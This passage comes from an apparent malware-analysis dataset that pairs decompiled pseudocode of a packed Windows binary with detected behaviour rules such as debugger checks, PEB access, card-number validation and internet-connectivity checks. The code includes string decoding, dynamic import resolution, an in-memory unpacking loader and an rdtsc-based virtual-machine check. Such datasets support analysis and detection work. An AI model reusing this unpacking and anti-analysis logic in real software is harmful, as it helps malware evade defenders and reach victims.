*piVar8 = iVar7 + -0x5078ceda;\n    in(iStack164);\n    iStack164 = 0x41cfe8;\n    Var12 = (*0x41f492)(extraout_ECX_29);\n    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_30;\n    pcVar1 = Var12 + -0x69;\n    *pcVar1 = *pcVar1 + -1;\n    iVar7 = in(Var12 >> 0x20);\n    piVar8 = piVar11 + 3;\n    piVar11[2] = iVar7 + -0x5078ceda;\n    iVar7 = in(0xcfb1);\n    uVar13 = extraout_ECX_30;\n    if (iVar7 != 0) goto code_r0x0041d779;\n    uVar4 = uStack120 ^ 0x6bcc24a6 | uStack116;\n    if (uVar4 != 0) {\n        Var12 = (*_sym.imp.KERNEL32.dll_GetVolumePathNamesForVolumeNameW)(uVar4);\n        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_05;\n        pcVar1 = Var12 + -0x69;\n        *pcVar1 = *pcVar1 + -1;\n        iVar7 = in(Var12 >> 0x20);\n        piVar9 = piVar11 + 4;\n        *piVar8 = iVar7 + -0x5078ceda;\n        iVar7 = in(0xc695);\n        if (iVar7 == 0) {\n            Var12 = (*_sym.imp.KERNEL32.dll_GetTapeStatus)(extraout_ECX_05);\n            *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n            *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_17;\n            pcVar1 = Var12 + -0x69;\n            *pcVar1 = *pcVar1 + -1;\n            iVar7 = in(Var12 >> 0x20);\n            piVar11 = piVar11 + 5;\n            *piVar9 = iVar7 + -0x5078ceda;\n            in(0xcaf2);\n            uVar13 = extraout_ECX_17;\ncode_r0x0041dceb:\n            Var12 = (*_sym.imp.USER32.dll_GetMenuContextHelpId)(uVar13);\n            *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n            *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_58;\n            pcVar1 = Var12 + -0x69;\n            *pcVar1 = *pcVar1 + -1;\n            iVar7 = in(Var12 >> 0x20);\n            *piVar11 = iVar7 + -0x5078ceda;\n            uVar4 = in(0xdcf2);\n            piVar9 = piVar11 + 1;\n            uVar13 = extraout_ECX_58;\n            if ((uVar4 & 1) != 0) {\n                return 10;\n            }\n            goto code_r0x0041d3de;\n        }\ncode_r0x0041e0a6:\n        Var12 = (*0x41f49e)();\n        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_68;\n        pcVar1 = Var12 + -0x69;\n        *pcVar1 = *pcVar1 + -1;\n        iVar7 = in(Var12 >> 0x20);\n        *piVar9 = iVar7 + -0x5078ceda;\n        in(0xe0b6);\n        Var12 = (*_sym.imp.KERNEL32.dll_GetFileType)(extraout_ECX_68);\n        *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n        *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_45;\n        pcVar1 = Var12 + -0x69;\n        *pcVar1 = *pcVar1 + -1;\n        iVar7 = in(Var12 >> 0x20);\n        piVar8 = piVar9 + 2;\n        piVar9[1] = iVar7 + -0x5078ceda;\n        in(0xd6b5);\n        uVar4 = extraout_ECX_45;\n    }\ncode_r0x0041d6e5:\n    Var12 = (*_sym.imp.KERNEL32.dll_FindResourceExW)(uVar4);\n    *(piVar5 + -0x6ec40e96) = *(piVar5 + -0x6ec40e96) ^ 0x43;\n    *(piVar5 + 0x71) = *(piVar5 + 0x71) - extraout_ECX_46;\n    pcVar1 = Var12 + -0x69;\n    *pcVar1 = *pcVar1 + -1;\n    iVar7 = in(Var12 >> 0x20);\n    *piVar8 = iVar7 + -0x5078ceda;\n    uVar4 = in(0xd6ec);\n    uStack156 = uVar4 & 1;\n    piVar5 = piStack24;\n    piVar8 = piStack128;\n    uVar13 = extraout_ECX_46;\n    if (uStack156 != 0) {\n        return 9;\n    }\n    goto code_r0x0041c959;\ncode_r0x0041ce90:\n    Var12 = (*_sym.imp.KERNEL32.dll_GetLocalTime)(extraout_ECX_53);\n    *(piStack24 + -0x6ec40e96) = *(piStack24 + -0x6ec40e96) ^ 0x43;\n    *(piStack24 + 0x71) = *(piStack24 + 0x71) - extraout_ECX_26;\n    pcVar1 = Var12 + -0x69;\n    *pcVar1 = *pcVar1 + -1;\n    iVar7 = in(Var12 >> 0x20);\n    *piVar8 = iVar7 + -0x5078ceda;\n    in(iStack164);\n    iStack164 = 0x41cedd;\n    Var12 = (*_sym.imp.USER32.dll_ChangeMenuA)(extraout_ECX_26);\n    *(piStack24 + -0x6ec40e96) = *(piStack24 + -0x6ec40e96) ^ 0x43;\n    *(piStack24 + 0x71) = *(piStack24 + 0x71) - extraout_ECX_27;\n    pcVar1 = Var12 + -0x69;\n    *pcVar1 = *pcVar1 + -1;\n    iVar7 = in(Var12 >> 0x20);\n    piVar10[6] = iVar7 + -0x5078ceda;\n    in(uStack156);\n    uStack156 = 0x41cf15;\n    Var12 = (*_sym.imp.OLEAUT32.dll_LoadRegTypeLib)(extraout_ECX_27);\n    *(piStack24 + -0x6ec40e96) = *(piStack24 + -0x6ec40e96) ^ 0x43;\n    *(piStack24 + 0x71) = *(piStack24 + 0x71) - extraout_ECX_28;\n    pcVar1 = Var12 + -0x69;\n    *pcVar1 = *pcVar1 + -1;\n    iVar7 = in(Var12 >> 0x20);\n    piVar10[7] = iVar7 + -0x5078ceda;\n    uVar4 = in(0xcea5);\n    piVar5 = piVar10 + 8 & 0xffff0000 | uStack144 & 0xffff;\n    if ((uVar4 & 1) != 0x588113f7) {\n        return 0xfffffffd;\n    }\n    Var12 = (*_sym.imp.KERNEL32.dll_GetThreadLocale)(extraout_ECX_28);\n    *0xe9bd0561 = *0xe9bd0561 ^ 0x43;\n    *0x58811468 = *0x58811468 - extraout_ECX_04;\n    pcVar1 = Var12 + -0x69;\n    *pcVar1 = *pcVar1 + -1;\n    iVar7 = in(Var12 >> 0x20);\n    piVar11 = piVar5 + 1;\n    *piVar5 = iVar7 + -0x5078ceda;\n    piVar8 = in(0xc624);\n    uVar13 = extraout_ECX_04;\n    if (piVar8 == 0xa77eec09) {\n        do {\n            Var12 = (*_sym.imp.USER32.dll_GetMenuItemCount)(uVar13);\n            *(piVar8 + -0x6ec40e96) = *(piVar8 + -0x6ec40e96) ^ 0x43;\n            *(piVar8 + 0x71) = *(piVar8 + 0x71) - extraout_ECX_70;\n            pcVar1 = Var12 + -0x69;\n            *pcVar1 = *pcVar1 + -1;\n            iVar7 = in(Var12 >> 0x20);\n            *piVar11 = iVar7 + -0x5078ceda;\n            in(iStack164);\n            iStack164 = 0x41e1ab;\n            Var12 = (*0x41f55e)(extraout_ECX_70);\n            *(piVar8 + -0x6ec40e96) = *(piVar8 + -0x6ec40e96) ^ 0x43;\n            *(piVar8 + 0x71) = *(piVar8 + 0x71) - extraout_ECX_71;\n            pcVar1 = Var12 + -0x69;\n            *pcVar1 = *pcVar1 + -1;\n            iVar7 = in(Var12 >> 0x20);\n            piVar11[1] = iVar7 + -0x5078ceda;\n            iVar7 = in(0xe174);\n            uVar13 = extraout_ECX_71;\n            if (iVar7 != 0) goto code_r0x0041d8fa;\n            Var12 = (*_sym.imp.KERNEL32.dll_DeactivateActCtx)(extraout_ECX_71);\n            *(piVar8 + -0x6ec40e96) = *(piVar8 + -0x6ec40e96) ^ 0x43;\n            *(piVar8 + 0x71) = *(piVar8 + 0x71) - extraout_ECX_42;\n            pcVar1 = Var12 + -0x69;\n            *pcVar1 = *pcVar1 + -1;\n            iVar7 = in(Var12 >> 0x20);\n            piVar11[2] = iVar7 + -0x5078ceda;\n            uVar4 = in(0xd54c);\n            piVar5 = 0xa77ed38d;\n            if ((uVar4 & 1) != 0) {\n                return 0xa77ed38d;\n            }\n            uVar3 = 0xdeb6;\n            Var12 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)(extraout_ECX_42);\n            *0x38bac4f7 = *0x38bac4f7 ^ 0x43;\n            *0xa77ed3fe = *0xa77ed3fe - extraout_ECX_63;\n            pcVar1 = Var12 + -0x69;\n            *pcVar1 = *pcVar1 + -1;\n            iVar7 = in(Var12 >> 0x20);\n            piVar9 = piVar11 + 4;\n            piVar11[3] = iVar7 + -0x5078ceda;\n            iVar7 = in(uStack156);\n            uVar13 = extraout_ECX_63;\n            if (iVar7 != 0) goto code_r0x0041cc1f;\n            uStack156 = 0x41d9c1;\n            Var12 = (*_sym.imp.KERNEL32.dll_MapViewOfFile)();\n            *0x38bac4f7 = *0x38bac4f7 ^ 0x43;\n            *0xa77ed3fe = *0xa77ed3fe - extraout_ECX_51;\n            pcVar1 = Var12 + -0x69;\n            *pcVar1 = *pcVar1 + -1;\n            iVar7 = in(Var12 >> 0x20);\n            piVar11 = piVar11 + 5;\n            *piVar9 = iVar7 + -0x5078ceda;\n            in(0xdeb6);\n            piVar8 = 0x6af21ba6 - uStack72;\n            iStack164 = -iStack68 - (0x6af21ba6 < uStack72);\n            uVar13 = extraout_ECX_51;\n        } while (iStack68 != 0 || -iStack68 < (0x6af21ba6 < uStack72));\ncode_r0x0041c9d7:\n        Var12 = (*_sym.imp.KERNEL32.dll_GetVolumeInformationA)();\n        *(piVar8 + -0x6ec40e96) = *(piVar8 + -0x6ec40e96) ^ 0x43;\n        *(piVar8 + 0x71) = *(piVar8 + 0x71) - extraout_ECX_14;\n        pcVar1 = Var12 + -0x69;\n        *pcVar1 = *pcVar1 + -1;\n        iVar7 = in(Var12 >> 0x20);\n        *piVar11 = iVar7 + -0x5078ceda;\n        uVar4 = in(0xc9de);\n        piVar11 = piVar11 + 1;\n        uVar13 = extraout_ECX_14;\n        if ((uVar4 & 1) != 0) {\n            return 0xfffffffe;\n        }\n    }\n    goto code_r0x0041d04c;\n}\n",
        "token_count": 15581
    },
    "0041e4e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t __cdecl fcn.0041e4e4(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t iStack64;\n    uint var_bp_ch;\n    \n    if (arg_10h != 0) {\n        iStack64 = 0;\n        do {\n            *(arg_8h + iStack64) = *(arg_ch + iStack64);\n            iStack64 = iStack64 + 1;\n        } while (iStack64 != arg_10h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 146
    },
    "0041eb53": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041eb53(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    int32_t var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    \n    arg_8h_00 = fcn.00401b5a(0x40, 0x1a000);\n    var_34h = 0;\n    if (arg_8h_00 != 0) {\n        fcn.0041e944(arg_8h_00, arg_ch);\n        *(arg_8h + 0x48) = arg_8h_00;\n        *(arg_8h + 0x4c) = arg_8h_00 + -0x400000;\n        var_34h = arg_8h_00 + 0x25b1;\n    }\n    return var_34h;\n}\n",
        "token_count": 242
    },
    "0041efe5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t fcn.0041efe5(void)\n\n{\n    uint64_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    char cVar4;\n    int16_t iVar5;\n    uchar in_XMM1 [16];\n    uint32_t uStack172;\n    int16_t aiStack168 [32];\n    int32_t iStack104;\n    uint32_t uStack100;\n    int32_t iStack96;\n    uint64_t auStack92 [4];\n    uint32_t uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint32_t uStack48;\n    int32_t iStack44;\n    uint32_t uStack40;\n    uint32_t uStack36;\n    char cStack31;\n    int16_t iStack30;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint var_ch;\n    \n    iVar5 = iStack30;\n    cVar4 = cStack31;\n    uVar3 = uStack36;\n    uVar2 = uStack40;\n    uStack24 = 0x4968c92;\n    uStack52 = 0;\n    uStack56 = 0x4689cd85;\n    uStack172 = 6;\n    while( true ) {\n        uStack48 = uStack172;\n        iStack96 = 0;\n        do {\n            uStack28 = 0x6ffb0fcf;\n            uStack36 = ~uVar3;\n            uStack40 = ~uVar2;\n            *(auStack92 + iStack96) = *(iStack96 + 0x437385) - *(iStack96 + 0x4373e3);\n            iStack96 = iStack96 + 1;\n        } while (iStack96 != 0xe);\n        uStack100 = uStack24 ^ 0x4968c92;\n        do {\n            uStack28 = ~uStack28;\n            cStack31 = cVar4 + '\\x02';\n            uVar1 = *(auStack92 + uStack100);\n            in_XMM1 = psraw(CONCAT142(SUB1614(CONCAT133(CONCAT121(SUB1612(CONCAT115(CONCAT101(SUB1610(CONCAT97(SUB169(\n                                                            CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(SUB166(CONCAT511(\n                                                            SUB165(CONCAT412(SUB164(CONCAT313(SUB163(CONCAT214(SUB162(\n                                                            CONCAT115(uVar1 >> 0x38, \n                                                                      CONCAT114(SUB161(in_XMM1 >> 0x38, 0), \n                                                                                SUB1614(in_XMM1, 0))) >> 0x70, 0), \n                                                            CONCAT113(uVar1 >> 0x30, SUB1613(in_XMM1, 0))) >> 0x68, 0), \n                                                            CONCAT112(SUB161(in_XMM1 >> 0x30, 0), SUB1612(in_XMM1, 0)))\n                                                            >> 0x60, 0), CONCAT111(uVar1 >> 0x28, SUB1611(in_XMM1, 0)))\n                                                            >> 0x58, 0), \n                                                            CONCAT110(SUB161(in_XMM1 >> 0x28, 0), SUB1610(in_XMM1, 0)))\n                                                            >> 0x50, 0), CONCAT19(uVar1 >> 0x20, SUB169(in_XMM1, 0))) >>\n                                                            0x48, 0), \n                                                            CONCAT18(SUB161(in_XMM1 >> 0x20, 0), SUB168(in_XMM1, 0))) >>\n                                                            0x40, 0), (uVar1 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (SUB167(in_XMM1, 0) >> 0x18) << 0x30) >> 0x30, 0), \n                                                            uVar1 >> 0x10), (SUB165(in_XMM1, 0) >> 0x10) << 0x20) >>\n                                                            0x20, 0), uVar1 >> 8), (SUB163(in_XMM1, 0) >> 8) << 0x10) >>\n                                              0x10, 0), SUB162(in_XMM1, 0) & 0xff | uVar1 << 8), 8);\n            *(aiStack168 + uStack100) = in_XMM1;\n            uStack100 = uStack100 + 8;\n        } while (uStack100 != 0x20);\n        iStack44 = 0;\n        if (aiStack168[0] == 0) break;\n        cStack31 = cVar4 * '\\x02';\n        iStack30 = iVar5 + 0x243a;\n        if (uStack48 < 5) {\n            iStack104 = fcn.0041b8b1(aiStack168, 0);\n            uStack60 = uStack48 - 1;\n            if (uStack48 - 1 < 2) {\n                iStack44 = iStack104;\n                if (iStack104 + *(iStack104 + 0x3c) == 0 || *(iStack104 + *(iStack104 + 0x3c)) != 0x4550) {\n                    iStack44 = 0;\n                }\n                return iStack44;\n            }\n        }\n        else {\n            uStack60 = uStack48 - 1;\n        }\n        iStack30 = 0;\n        uStack172 = uStack60;\n    }\n    return 0;\n}\n",
        "token_count": 1262
    },
    "00401b5a": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00401b5a(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    code *pcVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint uStack124;\n    int32_t iStack112;\n    char acStack74 [32];\n    int16_t iStack42;\n    uint32_t uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    int32_t iStack28;\n    uchar uStack21;\n    uint var_ch;\n    \n    iVar2 = iStack28;\n    uVar1 = uStack32;\n    uStack40 = 0x5e8dd2fa;\n    iStack112 = 0;\n    do {\n        uStack32 = uVar1 + 0x2fb3daa9;\n        iStack28 = iVar2 + (0xd04c2556 < uVar1);\n        uStack21 = 0x2f;\n        iVar5 = uStack40 + 0xa1722d14;\n        uStack36 = 0x4187efe5;\n        iStack42 = iStack42 + 0x4fc3;\n        uVar4 = uStack40 ^ 0x5e8dd2fb;\n        acStack74[iStack112] = *(iStack112 + 0x4373ab) - *(iStack112 + 0x4373e3);\n        iStack112 = iStack112 + uVar4;\n    } while (iStack112 != iVar5);\n    arg_8h_00 = fcn.0041efe5();\n    pcVar3 = fcn.0041b2f6(arg_8h_00, acStack74);\n    uStack32 = uVar1 ^ 0xc59d7c1;\n    uStack36 = 0x96e945b5;\n    uStack124 = 0;\n    if (0xff < pcVar3) {\n        iStack42 = 0x10d4;\n        uStack124 = (*pcVar3)(0, arg_ch, uStack40 + 0xa1723d06, arg_8h);\n    }\n    return uStack124;\n}\n",
        "token_count": 516
    },
    "00401dee": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nbool __cdecl fcn.00401dee(char *arg_8h)\n\n{\n    uint var_2h;\n    \n    return 0x33 < *arg_8h - 0x23U;\n}\n",
        "token_count": 62
    },
    "00401021": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401021(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    *0x421190 = arg_8h;\n    *0x421198 = arg_10h;\n    *0x421194 = arg_ch;\n    fcn.00401133();\n    return;\n}\n",
        "token_count": 73
    },
    "00401058": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.00401058(uint *arg_8h, uint8_t *arg_ch, uint *arg_10h)\n\n{\n    uint var_bp_ch;\n    \n    *arg_ch = *arg_8h * *arg_10h + 4U ^ *arg_ch;\n    return;\n}\n",
        "token_count": 83
    },
    "004010ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nint32_t __cdecl fcn.004010ec(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_bp_8h;\n    \n    return arg_ch * arg_ch * arg_ch + arg_8h * arg_8h * arg_8h;\n}\n",
        "token_count": 80
    },
    "00401e18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nuint __cdecl fcn.00401e18(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_bp_8h;\n    \n    *0x421188 = arg_8h;\n    *0x421194 = arg_ch;\n    *0x421198 = arg_10h;\n    return *0x421234;\n}\n",
        "token_count": 97
    },
    "0041b7f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041b7f4(int32_t arg_8h)\n\n{\n    int32_t in_FS_OFFSET;\n    uint var_8h;\n    \n    return *(in_FS_OFFSET + arg_8h);\n}\n",
        "token_count": 51
    },
    "0041b80d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b80d(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_ch;\n    uint var_8h;\n    \n    arg_8h_00 = fcn.0041efe5();\n    fcn.0041b2f6(arg_8h_00, arg_8h);\n    return;\n}\n",
        "token_count": 83
    },
    "0041b838": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "access PEB ldr_data",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "get ntdll base address"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint fcn.0041b838(void)\n\n{\n    int32_t in_FS_OFFSET;\n    uint var_bp_ch;\n    \n    return *(*(in_FS_OFFSET + 0x18) + 0x30);\n}\n",
        "token_count": 62
    },
    "0041bdad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x0041be1a)\n\nvoid __cdecl fcn.0041bdad(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uStack48;\n    uint var_bp_ch;\n    \n    if (arg_10h != 0) {\n        uStack48 = 0;\n        do {\n            *(arg_8h + uStack48) = *(arg_ch + uStack48) - *((uStack48 & 0xf) + 0x4373e3);\n            uStack48 = uStack48 + 1;\n        } while (uStack48 != arg_10h);\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid entry0(void)\n\n{\n    uint32_t in_EAX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint32_t unaff_EDI;\n    \n    *0x42123c = *0x42123c ^ in_EAX;\n    *0x42123c = *0x42123c ^ unaff_EDI;\n    *0x42123c = *0x42123c & 0x270;\n    *0x421238 = *0x421238 ^ 0x2a53;\n    // [00] -r-x section size 126976 named .text\n    fcn.00401021(unaff_EBX, unaff_EBP, *0x10);\n    return;\n}\n",
        "token_count": 161
    },
    "0041e22c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.0041e22c(uint arg_8h)\n\n{\n    uchar *arg_ch;\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t arg_10h;\n    int32_t iVar2;\n    uint in_stack_ffffff44;\n    int32_t iStack140;\n    int32_t iStack136;\n    char cStack125;\n    uint32_t uStack124;\n    uint uStack120;\n    int32_t iStack116;\n    int32_t iStack96;\n    code *pcStack80;\n    uchar auStack74 [2];\n    int32_t iStack72;\n    uint16_t uStack58;\n    uchar *puStack56;\n    char cStack45;\n    uint32_t uStack44;\n    uint32_t uStack40;\n    uint uStack28;\n    int32_t iStack24;\n    uint var_bp_ch;\n    \n    uStack28 = 0x7ac8694e;\n    iStack96 = 0;\n    iStack116 = 0;\n    do {\n        iVar2 = iStack116 * 0xcc;\n        iVar1 = iStack116 * 0xcc;\n        uStack44 = uStack44 & 0xffff;\n        iStack116 = iStack116 + 1;\n        iStack96 = (*(iVar2 + 0x4200c8) + iStack96) - *(iVar1 + 0x4200c0);\n    } while (iStack116 != 0x16);\n    iStack24 = iStack24 * 0x4cdd63f1;\n    fcn.00401d06(arg_8h, in_stack_ffffff44, auStack74, &pcStack80);\n    iStack24 = 0;\n    iVar1 = (*pcStack80)(0, iStack96, 0x1000, 4);\n    uStack58 = uStack58 ^ 0xffff;\n    iStack72 = iVar1 + 0xa2b;\n    iStack140 = 0;\n    iStack136 = 0;\n    do {\n        iVar2 = iStack136 * 0xcc;\n        arg_10h = *(iVar2 + 0x4200c8) - *(iVar2 + 0x4200c0);\n        arg_ch = *(iVar2 + 0x4200c4);\n        uStack40 = uStack124 & 0x34f6b6b;\n        *(iVar1 + iStack140) = *arg_ch;\n        fcn.0041e4e4(iVar1 + iStack140, arg_ch, arg_10h);\n        arg_8h_00 = fcn.0041efe5();\n        fcn.0041b2f6(arg_8h_00, uStack120);\n        cStack45 = 0x90;\n        iStack140 = arg_10h + iStack140;\n        iStack136 = iStack136 + 1;\n        puStack56 = auStack74;\n    } while (iStack136 != 0x7ac86964 - uStack44);\n    cStack45 = cStack125 + 'N';\n    fcn.0041bec5(iVar1, iVar1, 0x1000);\n    return 0;\n}\n",
        "token_count": 727
    },
    "0041e58b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nbool fcn.0041e58b(void)\n\n{\n    ulong uVar1;\n    ulong uVar2;\n    uint32_t unaff_EDI;\n    uint32_t uVar3;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint var_bp_ch;\n    \n    iStack60 = 0;\n    uStack64 = 0;\n    do {\n        uVar1 = rdtsc();\n        uVar2 = rdtsc();\n        uVar3 = uVar2 - uVar1;\n        if (iStack60 == 0) {\n            uStack64 = uVar3;\n            unaff_EDI = uVar3;\n        }\n        if (uVar3 < uStack64) {\n            uStack64 = uVar3;\n        }\n        if (unaff_EDI < uVar3) {\n            unaff_EDI = uVar3;\n        }\n        iStack60 = iStack60 + 1;\n    } while (iStack60 != 100);\n    return unaff_EDI == uStack64 && (uStack64 == 0 || (uStack64 == 0x53 || uStack64 == 3));\n}\n",
        "token_count": 270
    },
    "0041e715": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Removing unreachable block (ram,0x0041e7e3)\n\nuint fcn.0041e715(void)\n\n{\n    uint64_t uVar1;\n    uint8_t uVar2;\n    uint uVar3;\n    uchar in_XMM1 [16];\n    int32_t iStack152;\n    int32_t iStack148;\n    uint64_t auStack136 [4];\n    uchar auStack104 [64];\n    int32_t iStack40;\n    uint8_t uStack33;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    uint var_8h;\n    \n    uVar2 = uStack33;\n    iStack40 = 0x3c6b5b24;\n    iStack148 = 0;\n    do {\n        uStack32 = uStack32 | 0x2f3a6346;\n        *(auStack136 + iStack148) = *(iStack148 + 0x43737a) - *(iStack148 + 0x4373e3);\n        uStack28 = ~uStack28;\n        uStack32 = ~uStack32;\n        iStack148 = iStack148 + 1;\n    } while (iStack148 != 0xb);\n    iStack152 = iStack40 + -0x3c6b5b24;\n    do {\n        uStack33 = ~uVar2;\n        uVar1 = *(auStack136 + iStack152);\n        in_XMM1 = psraw(CONCAT142(SUB1614(CONCAT133(CONCAT121(SUB1612(CONCAT115(CONCAT101(SUB1610(CONCAT97(SUB169(\n                                                            CONCAT88(SUB168(CONCAT79(SUB167(CONCAT610(SUB166(CONCAT511(\n                                                            SUB165(CONCAT412(SUB164(CONCAT313(SUB163(CONCAT214(SUB162(\n                                                            CONCAT115(uVar1 >> 0x38, \n                                                                      CONCAT114(SUB161(in_XMM1 >> 0x38, 0), \n                                                                                SUB1614(in_XMM1, 0))) >> 0x70, 0), \n                                                            CONCAT113(uVar1 >> 0x30, SUB1613(in_XMM1, 0))) >> 0x68, 0), \n                                                            CONCAT112(SUB161(in_XMM1 >> 0x30, 0), SUB1612(in_XMM1, 0)))\n                                                            >> 0x60, 0), CONCAT111(uVar1 >> 0x28, SUB1611(in_XMM1, 0)))\n                                                            >> 0x58, 0), \n                                                            CONCAT110(SUB161(in_XMM1 >> 0x28, 0), SUB1610(in_XMM1, 0)))\n                                                            >> 0x50, 0), CONCAT19(uVar1 >> 0x20, SUB169(in_XMM1, 0))) >>\n                                                            0x48, 0), \n                                                            CONCAT18(SUB161(in_XMM1 >> 0x20, 0), SUB168(in_XMM1, 0))) >>\n                                                            0x40, 0), (uVar1 >> 0x18) << 0x38) >> 0x38, 0), \n                                                            (SUB167(in_XMM1, 0) >> 0x18) << 0x30) >> 0x30, 0), \n                                                            uVar1 >> 0x10), (SUB165(in_XMM1, 0) >> 0x10) << 0x20) >>\n                                                            0x20, 0), uVar1 >> 8), (SUB163(in_XMM1, 0) >> 8) << 0x10) >>\n                                          0x10, 0), SUB162(in_XMM1, 0) & 0xff | uVar1 << 8), 8);\n        uStack32 = 0;\n        uStack28 = 0;\n        *(auStack104 + iStack152 * 2) = in_XMM1;\n        iStack152 = iStack152 + 8;\n        uStack32 = uStack32 | 0x2160608;\n        uStack33 = uVar2 & 0x7a;\n    } while (iStack152 != 0x20);\n    uStack28 = 0;\n    